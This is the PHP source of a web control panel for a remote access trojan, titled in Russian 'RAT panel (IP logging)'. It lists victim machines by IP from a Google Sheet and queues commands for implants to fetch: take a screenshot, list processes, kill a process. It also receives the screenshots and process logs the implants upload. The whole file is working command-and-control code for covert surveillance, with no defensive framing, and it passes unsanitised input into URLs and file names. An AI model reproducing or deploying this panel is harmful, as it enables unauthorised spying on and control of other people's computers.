<?php
header("Cache-Control: no-cache, must-revalidate");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");

$csvUrl = "https://docs.google.com/spreadsheets/d/e/2PACX-1vTdx2B6KMZldMKf_mGRigmL0AqP0DtaNmaHeJhJQI31AJgd1hIgRMFk_Mv5DlDKm0AzI_mJF0Lfg7Ev/pub?gid=0&single=true&output=csv";
$googleExecUrl = "https://script.google.com/macros/s/AKfycbzM-qCeDJlu8YA6b04MSBIPt2E0WjLBt2yNBQqXzrva38HnSZ2vNPt4rx1SU9DLoAZjow/exec";

// ОБРАБОТКА ПЕРЕИМЕНОВАНИЯ
if (isset($_POST['rename_pc'])) {
    $targetIp = $_POST['ip'];
    $newName = urlencode($_POST['new_name']);
    // Шлем запрос на переименование в Google Apps Script
    @file_get_contents($googleExecUrl . "?rename=1&ip={$targetIp}&new_name={$newName}");
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ОБРАБОТКА КНОПОК УПРАВЛЕНИЯ
if (isset($_POST['send_cmd'])) {
    $pc_id = $_POST['pc_id'];
    $cmd = $_POST['cmd'];
    if ($_POST['action'] == 'delete' && !empty($_POST['proc_name'])) {
        $cmd .= " " . $_POST['proc_name'];
    }
    file_put_contents("cmd_{$pc_id}.txt", $cmd);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ПРИЕМ ЛОГОВ/СКРИНШОТОВ
if (isset($_FILES['screen'])) { move_uploaded_file($_FILES['screen']['tmp_name'], "screenshot.jpg"); exit("ok"); }
if (isset($_POST['log'])) { file_put_contents("log.txt", $_POST['log']); exit("ok"); }
if (isset($_GET['get_cmd'])) { $pc_id = $_GET['pc_id']; $file = "cmd_{$pc_id}.txt"; echo file_exists($file) ? file_get_contents($file) : "none"; exit; }
if (isset($_GET['clear_cmd'])) { $pc_id = $_GET['pc_id']; @unlink("cmd_{$pc_id}.txt"); exit("ok"); }

// ЧИТАЕМ ДАННЫЕ И СТРОИМ ИСТОРИЮ
$data = @file_get_contents($csvUrl);
$pcs = [];

if ($data !== false) {
    $rows = array_map('str_getcsv', explode("\n", $data));
    array_shift($rows); // убираем шапку
    
    foreach ($rows as $row) {
        if (count($row) < 3) continue;
        $time = trim($row[0]);
        $ip = trim($row[1]);
        $status = trim($row[2]);
        $name = isset($row[3]) ? trim($row[3]) : "Новое устройство";
        
        if (empty($ip)) continue;
        
        // Группируем логи по IP
        if (!isset($pcs[$ip])) {
            $pcs[$ip] = [
                'name' => $name,
                'history' => []
            ];
        }
        $pcs[$ip]['history'][] = "[{$time}] Статус: {$status}";
    }
}
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Панель RAT (IP логирование)</title>
    <style>
        body { background: #0f172a; color: white; font-family: system-ui, sans-serif; padding: 20px; }
        .grid { display: flex; flex-wrap: wrap; gap: 20px; }
        .card { background: #1e293b; padding: 20px; border-radius: 12px; width: 330px; border: 1px solid #334155; }
        .btn { background: #3b82f6; color: white; border: none; padding: 8px 12px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 5px; }
        .btn-danger { background: #ef4444; }
        input[type="text"] { width: calc(100% - 16px); padding: 6px; border-radius: 6px; border: 1px solid #475569; background: #334155; color: white; margin-bottom: 5px; }
        .history-box { background: #020617; font-family: monospace; padding: 8px; border-radius: 6px; max-height: 100px; overflow-y: auto; font-size: 11px; color: #10b981; margin-top: 10px; }
        .console { background: #020617; font-family: monospace; padding: 10px; border-radius: 6px; height: 120px; overflow-y: auto; color: #38bdf8; font-size: 12px; }
    </style>
</head>
<body>

    <h1>Мониторинг по IP-адресам железа</h1>

    <div class="grid">
        <?php foreach($pcs as $ip => $info): ?>
            <div class='card'>
                <div style="font-size: 20px; font-weight: 700; color: #f8fafc;"><?= htmlspecialchars($info['name']) ?></div>
                <div style="font-size: 12px; color: #94a3b8; margin-bottom: 10px;">IP: <?= htmlspecialchars($ip) ?></div>
                
                <form method="post" style="margin-bottom: 15px;">
                    <input type="hidden" name="ip" value="<?= htmlspecialchars($ip) ?>">
                    <input type="text" name="new_name" placeholder="Новое имя ПК" required>
                    <button type="submit" name="rename_pc" class="btn" style="background:#10b981;">✏️ Переименовать</button>
                </form>

                <hr style="border-color: #334155;">

                <form method="post">
                    <input type="hidden" name="pc_id" value="<?= htmlspecialchars($ip) ?>">
                    <input type="hidden" name="send_cmd" value="1">
                    <button type="submit" name="cmd" value="screen" class="btn">📸 Скриншот</button>
                </form>

                <form method="post">
                    <input type="hidden" name="pc_id" value="<?= htmlspecialchars($ip) ?>">
                    <input type="hidden" name="send_cmd" value="1">
                    <button type="submit" name="cmd" value="app" class="btn">📋 Процессы</button>
                </form>

                <form method="post" style="margin-top: 5px;">
                    <input type="hidden" name="pc_id" value="<?= htmlspecialchars($ip) ?>">
                    <input type="hidden" name="send_cmd" value="1">
                    <input type="hidden" name="cmd" value="delete">
                    <input type="text" name="proc_name" placeholder="Имя процесса">
                    <button type="submit" name="action" value="delete" class="btn btn-danger">❌ Убить процесс</button>
                </form>

                <div style="font-size: 12px; margin-top: 15px; color:#94a3b8;">История входов (макс. 10):</div>
                <div class="history-box">
                    <?php foreach(array_reverse($info['history']) as $log): ?>
                        <div><?= htmlspecialchars($log) ?></div>
                    <?php endforeach; ?>
                </div>
            </div>
        <?php endforeach; ?>

        <div class="card" style="width: 400px;">
            <h3>Вывод данных</h3>
            <h4>Лог процессов:</h4>
            <div class="console"><?= file_exists("log.txt") ? htmlspecialchars(file_get_contents("log.txt")) : "Пусто..." ?></div>
            <h4>Экран:</h4>
            <div style="border: 1px solid #334155; border-radius: 6px; overflow: hidden; margin-top: 10px;">
                <?php if(file_exists("screenshot.jpg")): ?>
                    <img src="screenshot.jpg?t=<?= time() ?>" style="width:100%;">
                <?php else: ?>
                    <div style="padding:20px; text-align:center; color:#64748b;">Нет скриншота</div>
                <?php endif; ?>
            </div>
        </div>
    </div>

</body>
</html>
